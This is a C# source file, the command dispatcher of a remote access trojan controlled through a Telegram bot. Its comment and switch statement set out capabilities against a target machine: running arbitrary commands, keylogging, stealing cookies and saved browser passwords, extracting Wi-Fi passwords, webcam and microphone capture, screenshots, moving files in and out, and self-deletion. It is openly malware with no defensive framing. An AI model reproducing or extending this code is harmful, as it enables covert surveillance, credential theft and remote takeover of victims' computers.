using System;
using System.Threading;

namespace TelegramRAT
{
    /* --------------------------------------------------------------
     * Implemented commands:
     * /popup <id> <text>: a popup containing "text" is shown to the target. 
     * /ipinfo <id>: information about the target's IP and location is retrieved. 
     * /screenshot <id>: a screenshot of the target's screen at the time of execution is retrieved.
     * /download <id> <file>: the file specified by <file> is retrieved.
     * /upload <id> <path>: it indicates to the target where to download the file that will be sent to the bot.
     * /exec <id> <command>: it executes <command> on the target machine, returning its response.
     * /start <id> <appName> <parameters>: the app specified by <appName> with <parameters> parameters is run.
     * /apps <id>: a list of the installed apps is retrieved.
     * /info <id>: user and PC information is retrieved.
     * /listdirs <id> <path>: a list of the directories inside of <path> is retrieved.
     * /listfiles <id> <path>: a list of the files inside of <path> is retrieved.
     * /listdrives <id>: a list of the installed drives is retrieved.
     * /getclipboard <id>: the text saved in the target's clipboard, if any, is retrieved.
     * /micrec <id>: starts/stops microphone recording (if there is any).
     * /cookies <id>: a compressed file of the target's cookies is retrieved.
     * /weblogins <id>: browser information, such as saved passwords, is retrieved.
     * /keylogger <id>: a log with all pressed keys is retrieved.
     * /webcam <id> <delay> <camera>: takes a picture after <delay> milliseconds using <camera> (if there is any); default camera is usually 1. 
     * /startup <id>: a list of startup apps is retrieved.
     * /reroll <id>: the target's ID is changed.
     * /selfdestruct <id>: program execution is stopped and its files are deleted.
     * /wifiprofiles <id>: a list of WiFi profiles, alongside their passwords, is retrieved.
     * ---------------------------------------------------------------
    */
    public static class CommandHandler
    {
        public static void Execute (TelegramAPI tg, string command)
        {
            string[] words = command.Split(' ');
            try
            {
                int idDestino = Int32.Parse(words[1]);
                // Check if the command is directed to me (0 is broadcast)
                if (idDestino != 0 && idDestino != tg.GetID())
                    return;
            }
            catch
            {
                tg.SendMessage("You must specify the target's ID!");
                return;
            }
            string commandName = words[0].Remove(0, 1).ToUpper();
            Action action;
            // Command handler
            switch (commandName)
            {
                case "POPUP":
                    string text;
                    try
                    {
                        text = string.Join(" ", words, 2, words.Length - 2);
                    }
                    catch (IndexOutOfRangeException)
                    {
                        tg.SendMessage("You must specify the text for the POPUP!");
                        return;
                    }

                    action = () => Actions.PopUp(tg, text);
                    break;

                case "IPINFO":
                    action = () => Actions.IPInfo(tg);
                    break;

                case "SCREENSHOT":
                    action = () => Actions.TakeScreenshot(tg);
                    break;

                case "DOWNLOAD":
                    string file;
                    try
                    {
                        file = string.Join(" ", words, 2, words.Length - 2);
                    }
                    catch (IndexOutOfRangeException)
                    {
                        tg.SendMessage("You must specify the file path!");
                        return;
                    }

                    action = () => Actions.UploadFile(tg, file);
                    break;

                case "UPLOAD":
                    string filePath;
                    try
                    {
                        filePath = string.Join(" ", words, 2, words.Length - 2);
                    }
                    catch (IndexOutOfRangeException)
                    {
                        tg.SendMessage("You must specify the file path!");
                        return;
                    }

                    action = () => Actions.WaitForDownload(tg, filePath);
                    break;

                case "EXEC":
                    string commands;
                    try
                    {
                        commands = string.Join(" ", words, 2, words.Length - 2);
                    }
                    catch (IndexOutOfRangeException)
                    {
                        tg.SendMessage("You must specify the commands to run!");
                        return;
                    }

                    action = () => Actions.Exec(tg, commands);
                    break;

                case "START":
                    string programFile;
                    try
                    {
                        programFile = words[2];
                    }
                    catch (IndexOutOfRangeException)
                    {
                        tg.SendMessage("You must specify the program to run!");
                        return;
                    }
                    string parameters = String.Empty;
                    if (words.Length > 3)
                        parameters = string.Join(" ", words, 3, words.Length - 3);

                    action = () => Actions.StartProcess(tg, programFile, parameters, false);
                    break;

                case "INFO":
                    action = () => Actions.SystemInfo(tg);
                    break;

                case "APPS":
                    action = () => Actions.GetInstalledApps(tg);
                    break;

                case "COOKIES":
                    action = () => Actions.GetCookies(tg);
                    break;

                case "WEBLOGINS":
                    action = () => Actions.GetWebLogins(tg);
                    break;

                case "LISTDIRS":
                    string path = String.Empty;
                    if (words.Length < 2)
                    {
                        tg.SendMessage("You must specify the directory's path!");
                        return;
                    }
                    else
                    {
                        path = string.Join(" ", words, 2, words.Length - 2);
                    }

                    action = () => Actions.ListDirs(tg, path);
                    break;

                case "LISTFILES":
                    string dirPath = String.Empty;
                    if (words.Length < 2)
                    {
                        tg.SendMessage("You must specify the directory's path!");
                        return;
                    }
                    else
                    {
                        dirPath = string.Join(" ", words, 2, words.Length - 2);
                    }

                    action = () => Actions.ListFiles(tg, dirPath);
                    break;

                case "LISTDRIVES":
                    action = () => Actions.ListDrives(tg);
                    break;

                case "MICREC":
                    tg.ChangeRecordingStatus();
                    return;

                case "GETCLIPBOARD":
                    action = () => Actions.GetClipboard(tg);
                    break;

                case "KEYLOGGER":
                    action = () => Actions.RetrieveLog(tg);
                    break;

                case "STARTUP":
                    action = () => Actions.Startup(tg);
                    break;

                case "WEBCAM":
                    string delay = String.Empty;
                    string camera = String.Empty;
                    if (words.Length < 3)
                    {
                        tg.SendMessage("You must specify the delay and camera to use!");
                        return;
                    }
                    else
                    {
                        delay = words[2];
                        camera = string.Join(" ", words, 3, words.Length - 3);
                    }
                    action = () => Actions.WebcamSnapshot(tg, delay, camera);
                    break;

                case "SELFDESTRUCT":
                    tg.waitsForSelfdestruction = true;
                    tg.SendMessage("Send the command /confirm to carry out the self-destruction");
                    return;

                case "CONFIRM":
                    if (tg.waitsForSelfdestruction)
                        action = () => Actions.RemoveSelf(tg);
                    else
                        return;
                    break;

                case "REROLL":
                    int oldID = tg.GetID();
                    tg.ChangeID();
                    tg.SendMessage("My previous ID was: " + oldID);
                    return;

                case "WIFIPROFILES":
                    action = () => Actions.GetWifiProfilesAndPasswords(tg);
                    break;

                default:
                    tg.SendMessage("Invalid command");
                    return;
            }

            Thread t = new Thread(action.Invoke);
            t.Start();
        }
    }
}
